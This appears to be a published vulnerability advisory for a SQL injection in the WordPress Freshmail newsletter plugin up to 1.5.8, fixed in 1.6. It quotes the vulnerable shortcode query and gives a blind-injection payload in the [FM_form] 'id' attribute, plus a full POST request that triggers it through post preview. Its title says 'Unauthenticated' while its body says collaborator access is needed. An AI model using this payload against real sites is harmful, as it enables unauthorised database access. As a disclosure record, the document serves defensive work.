@@ -1,0 +1,215 @@
+# Exploit Title: Unauthenticated SQL Injection on Wordpress Freshmail (#1)
+# Google Dork: N/A
+# Date: 05/05/2015
+# Exploit Author: Felipe Molina de la Torre (@felmoltor)
+# Vendor Homepage:
+*http://freshmail.com/ <http://freshmail.com/> *
+# Software Link:
+*https://downloads.wordpress.org/plugin/freshmail-newsletter.latest-stable.zip
+<https://downloads.wordpress.org/plugin/freshmail-newsletter.latest-stable.zip>*
+# Version: <= 1.5.8, Communicated and Fixed by the Vendor in 1.6
+# Tested on: Linux 2.6, PHP 5.3 with magic_quotes_gpc turned off, Apache
+2.4.0 (Ubuntu)
+# CVE : N/A
+# Category: webapps
+
+1. Summary
+------------------
+
+Freshmail plugin is an email marketing plugin for wordpress, allowing the
+administrator to create mail campaigns and keep track of them.
+
+There is a SQL Injection vulnerability available for collaborators (or
+higher privileged users) for webs with freshmail plugin installed. The SQL
+Injection in located in the attribute "id" of the inserted shortcode
+[FM_form *id="N"*]. The shortcode attribute "id" is not sanitized before
+inserting it in a SQL query.
+
+A collaborator can insert shortcodes when he/she is editing a new post or
+page and can preview the results (no administrator approval needed),
+launching this SQL Injection.
+
+
+2. Vulnerability timeline
+----------------------------------
+
+- 04/05/2015: Identified in version 1.5.8 and contact the developer company
+by twitter.
+- 05/05/2015: Send the details by mail to developer.
+
+- 05/05/2015: Response from the developer.
+- 06/05/2015: Fixed version in 1.6
+
+3. Vulnerable code
+---------------------------
+
+Vulnerable File: include/shortcode.php, lines 27 and 120:
+
+Line 19: function fm_form_func($atts)
+[...]
+Line 27: $form_value = $wpdb->get_row("select * from
+".$wpdb->prefix.'fm_forms where form_id="'.$atts['id'].'";');
+[...]
+Line 120: add_shortcode('FM_form', 'fm_form_func');
+
+
+3. Proof of concept
+---------------------------
+
+1. As collaborator, start a new post.
+2. Insert the shortcode [FM_form id='1" and substr(user(),1,1)="b']
+3. Click preview.
+4. If the form is shown, the statement is true, if not, false.
+
+POST /wp-admin/post.php HTTP/1.1
+Host: <web>
+Content-Length: 3979
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: <web>
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/43.0.2357.37 Safari/537.36
+Content-Type: multipart/form-data;
+boundary=----WebKitFormBoundary384PE6lRgBcOibkL
+Referer: http://<web>/wp-admin/post.php?post=69&action=edit&message=8
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8,es;q=0.6
+Cookie: wordpress_f305[...]
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="_wpnonce"
+
+0a75a3666b
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="_wp_http_referer"
+
+/wp-admin/post.php?post=69&action=edit&message=8
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="user_ID"
+
+4
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="action"
+
+editpost
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="originalaction"
+
+editpost
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="post_author"
+
+4
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="post_type"
+
+post
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="original_post_status"
+
+pending
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="referredby"
+
+http://<web>/wp-admin/post.php?post=69&action=edit&message=8
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="_wp_original_http_referer"
+
+http://<web>/wp-admin/post.php?post=69&action=edit&message=8
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="post_ID"
+
+69
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="meta-box-order-nonce"
+
+f8aa04e508
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="closedpostboxesnonce"
+
+ebf65a43ed
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="post_title"
+
+Testing SQLi in shortcode
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="samplepermalinknonce"
+
+e753a2d8f2
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="content"
+
+[FM_form id='1" and substr(user(),1,1)="b]
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="wp-preview"
+
+dopreview
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="original_publish"
+
+Submit for Review
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="post_format"
+
+0
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="post_category[]"
+
+0
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="post_category[]"
+
+1
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="tax_input[post_tag]"
+
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="newtag[post_tag]"
+
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="excerpt"
+
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="trackback_url"
+
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="metakeyselect"
+
+#NONE#
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="metakeyinput"
+
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="metavalue"
+
+
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="_ajax_nonce-add-meta"
+
+6a13a5a808
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="advanced_view"
+
+1
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="comment_status"
+
+open
+------WebKitFormBoundary384PE6lRgBcOibkL
+Content-Disposition: form-data; name="ping_status"
+
+open
+------WebKitFormBoundary384PE6lRgBcOibkL--
+
+
+5. Solution
+---------------
+
+Update to version 1.6
